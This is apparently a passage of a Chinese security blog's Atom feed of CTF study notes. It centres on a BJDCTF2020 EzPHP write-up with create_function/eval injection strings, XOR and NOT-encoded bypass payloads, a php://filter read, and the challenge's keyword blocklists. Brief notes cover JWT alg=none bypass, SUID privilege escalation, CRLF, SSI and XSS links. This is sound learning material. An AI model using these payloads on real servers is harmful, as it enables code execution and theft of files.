class="string">'return($a+$b);&#125;eval($_POST["a"]);\\'</span>)</span><br></pre></td></tr></table></figure><p>相当于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span><span class="params">($a, $b)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> $a+$b; &#125; </span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>结合上面的extract()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;flag[arg]=&#125;a();//&amp;flag[code]=create_function</span><br></pre></td></tr></table></figure><h3 id="get-defined-vars-输出所有变量的值"><a href="#get-defined-vars-输出所有变量的值" class="headerlink" title="get_defined_vars()输出所有变量的值"></a>get_defined_vars()输出所有变量的值</h3><p>方法一</p><p>过滤了include 还能用require<br>过滤了引号，可以使用那些参数可以不加引号的函数，require()代替require “ “<br>过滤了flag，可以base64编码。其他过滤的不用便是</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(base64_decode(MWZsYWcucGhw));</span><br></pre></td></tr></table></figure><p>方法二</p><p>正则匹配了&amp;和|导致无法与运算和或运算，但是可以^异或和~按位取反</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;%66%6c%61%67[arg]=&#125;require(%ce%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff);var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure><p>其中，%ce%99%93%9e%98%d1%8f%97%8f^%ff%ff%ff%ff%ff%ff%ff%ff%ff 这个异或运算的结果就是1flag.php</p><p>生成异或表达式脚本呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$flag = <span class="string">"1 f l a g . p h p"</span>;</span><br><span class="line">$arr = explode(<span class="string">' '</span>, $flag);</span><br><span class="line"></span><br><span class="line">foreach ($arr as $key =&gt; $value) &#123;</span><br><span class="line">echo <span class="string">"%"</span>.dechex(ord($value)^<span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">"^"</span>;</span><br><span class="line">foreach ($arr as $key =&gt; $value) &#123;</span><br><span class="line">echo <span class="string">"%ff"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法三</p><p>取反+伪协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%CE%99%93%9E%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure><p>关键代码取反</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=1flag.php</span><br></pre></td></tr></table></figure><p>生成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="string">"p h p : / / f i l t e r / r e a d = c o n v e r t . b a s e 6 4 - e n c o d e / r e s o u r c e = 1 f l a g . p h p"</span>;</span><br><span class="line">$arr1 = explode(<span class="string">' '</span>, $a);</span><br><span class="line">echo <span class="string">"&lt;br&gt;~("</span>;</span><br><span class="line">foreach ($arr1 as $key =&gt; $value) &#123;</span><br><span class="line">echo <span class="string">"%"</span>.bin2hex(~$value);</span><br><span class="line">&#125;</span><br><span class="line">echo <span class="string">")&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;BJDCTF2020-EzPHP&quot;&gt;&lt;a href=&quot;#BJDCTF2020-EzPHP&quot; class=&quot;headerlink&quot; title=&quot;[BJDCTF2020]EzPHP&quot;&gt;&lt;/a&gt;[BJDCTF2020]EzPHP&lt;/h2&gt;&lt;p&gt;​    点开后，右键查看代码，发现有个base32加密的，解密后是1nD3x.php页面提示，进入查看源代码&lt;/p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$file = &lt;span class=&quot;string&quot;&gt;&quot;1nD3x.php&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$shana = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;shana&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$passwd = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;passwd&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$arg = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$code = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br /&amp;gt;&amp;lt;font color=red&amp;gt;&amp;lt;B&amp;gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&amp;lt;/B&amp;gt;&amp;lt;br&amp;gt;&amp;lt;/font&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($_SERVER) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#39;|log/i&#39;&lt;/span&gt;, $_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;QUERY_STRING&#39;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        )  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;You seem to want to do something bad?&#39;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/http|https/i&#39;&lt;/span&gt;, $_GET[&lt;span class=&quot;string&quot;&gt;&#39;file&#39;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/^aqua_is_cute$/&#39;&lt;/span&gt;, $_GET[&lt;span class=&quot;string&quot;&gt;&#39;debu&#39;&lt;/span&gt;]) &amp;amp;&amp;amp; $_GET[&lt;span class=&quot;string&quot;&gt;&#39;debu&#39;&lt;/span&gt;] !== &lt;span class=&quot;string&quot;&gt;&#39;aqua_is_cute&#39;&lt;/span&gt;) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $file = $_GET[&lt;span class=&quot;string&quot;&gt;&quot;file&quot;&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Neeeeee! Good Job!&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;fxck you! What do you want to do ?!&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($_REQUEST) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt;($_REQUEST &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $value) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/[a-zA-Z]/i&#39;&lt;/span&gt;, $value))  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;fxck you! I hate English!&#39;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (file_get_contents($file) !== &lt;span class=&quot;string&quot;&gt;&#39;debu_debu_aqua&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;Aqua is the cutest five-year-old child in the world! Isn&#39;t it ?&amp;lt;br&amp;gt;&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( sha1($shana) === sha1($passwd) &amp;amp;&amp;amp; $shana != $passwd )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    extract($_GET[&lt;span class=&quot;string&quot;&gt;&quot;flag&quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Very good! you know my password. But what is flag?&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;fxck you! you don&#39;t know my password! And you don&#39;t know sha1! why you come here!&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/^[a-z0-9]*$/isD&#39;&lt;/span&gt;, $code) || &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&amp;#123;|\%|x|\&amp;amp;|\$|\*|\||\&amp;lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;&lt;/span&gt;, $arg) ) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br /&amp;gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;flag.php&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $code(&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;, $arg); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>系统命令学习</title>
    <link href="http://yoursite.com/2020/07/13/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/07/13/%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-07-13T11:37:14.000Z</published>
    <updated>2020-09-08T11:18:55.037Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://cjm00n.top/Linux/system-command-learning.html" target="_blank" rel="noopener">系统命令学习</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://cjm00n.top/Linux/system-command-learning.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;系统命令学习&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>linux基础命令学习</title>
    <link href="http://yoursite.com/2020/07/13/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/07/13/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-07-13T11:31:53.000Z</published>
    <updated>2020-09-08T11:18:59.954Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://cjm00n.top/Linux/linux-command-learning.html" target="_blank" rel="noopener">linux基础命令学习</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://cjm00n.top/Linux/linux-command-learning.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;linux基础命令学习&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux下的提权</title>
    <link href="http://yoursite.com/2020/06/19/Linux%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2020/06/19/Linux%E4%B8%8B%E7%9A%84%E6%8F%90%E6%9D%83/</id>
    <published>2020-06-19T10:44:30.000Z</published>
    <updated>2020-09-08T11:19:44.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux下用SUID提权"><a href="#Linux下用SUID提权" class="headerlink" title="Linux下用SUID提权"></a>Linux下用SUID提权</h1><p><a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">Linux下用SUID提权</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux下用SUID提权&quot;&gt;&lt;a href=&quot;#Linux下用SUID提权&quot; class=&quot;headerlink&quot; title=&quot;Linux下用SUID提权&quot;&gt;&lt;/a&gt;Linux下用SUID提权&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>php伪协议</title>
    <link href="http://yoursite.com/2020/06/18/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2020/06/18/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</id>
    <published>2020-06-18T10:34:02.000Z</published>
    <updated>2020-09-08T11:19:56.275Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/php-filter-magic.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;谈一谈php://filter的妙用&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>CRLF Injection</title>
    <link href="http://yoursite.com/2020/06/14/CRLF-Injection/"/>
    <id>http://yoursite.com/2020/06/14/CRLF-Injection/</id>
    <published>2020-06-14T07:40:53.000Z</published>
    <updated>2020-09-08T11:19:31.394Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/d4c304dbd0af" target="_blank" rel="noopener">CRLF Injection漏洞的利用与实例分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/d4c304dbd0af&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CRLF Injection漏洞的利用与实例分析&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>JWT令牌攻击</title>
    <link href="http://yoursite.com/2020/06/13/JWT%E4%BB%A4%E7%89%8C%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2020/06/13/JWT%E4%BB%A4%E7%89%8C%E6%94%BB%E5%87%BB/</id>
    <published>2020-06-13T09:30:00.000Z</published>
    <updated>2020-09-08T11:20:15.452Z</updated>
    
    <content type="html"><![CDATA[<h3 id="博客讲解："><a href="#博客讲解：" class="headerlink" title="博客讲解："></a>博客讲解：</h3><blockquote><p>关于jwt的讲解： <a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a><br><a href="https://www.cnblogs.com/z-sm/p/9125995.html" target="_blank" rel="noopener">https://www.cnblogs.com/z-sm/p/9125995.html</a><br><a href="https://www.jianshu.com/p/1ce08a374bb5" target="_blank" rel="noopener">https://www.jianshu.com/p/1ce08a374bb5</a><br>jwt攻击手段：<a href="https://www.freebuf.com/articles/web/181261.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/181261.html</a></p><p><a href="https://www.cnblogs.com/karsa/p/12762297.html" target="_blank" rel="noopener">刷题EasyLogin</a></p></blockquote><a id="more"></a><p> 形式：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.（这里有一个点）eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.（这里也有一个点）TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ<br>第一个点前为header，第二个点前为payload，第二个点后为signture<br>一个攻击点：当header中的alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器。 </p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;博客讲解：&quot;&gt;&lt;a href=&quot;#博客讲解：&quot; class=&quot;headerlink&quot; title=&quot;博客讲解：&quot;&gt;&lt;/a&gt;博客讲解：&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;关于jwt的讲解： &lt;a href=&quot;http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.cnblogs.com/z-sm/p/9125995.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/z-sm/p/9125995.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.jianshu.com/p/1ce08a374bb5&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/1ce08a374bb5&lt;/a&gt;&lt;br&gt;jwt攻击手段：&lt;a href=&quot;https://www.freebuf.com/articles/web/181261.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/web/181261.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/karsa/p/12762297.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;刷题EasyLogin&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>SSI注入漏洞</title>
    <link href="http://yoursite.com/2020/05/14/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/05/14/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-05-14T03:22:27.000Z</published>
    <updated>2020-09-08T11:23:24.525Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844" target="_blank" rel="noopener">SSI注入漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_40657585/article/details/84260844&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;SSI注入漏洞&lt;/a&gt;&lt;/p&gt;
      
    
    </summary>
    
    
      <category term="笔记" scheme="http://yoursite.com/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF XSS</title>
    <link href="http://yoursite.com/2020/05/13/CTF-XSS/"/>
    <id>http://yoursite.com/2020/05/13/CTF-XSS/</id>
    <published>2020-05-13T09:45:47.000Z</published>
    <updated>2020-09-08T11:18:40.546Z</updated>
    
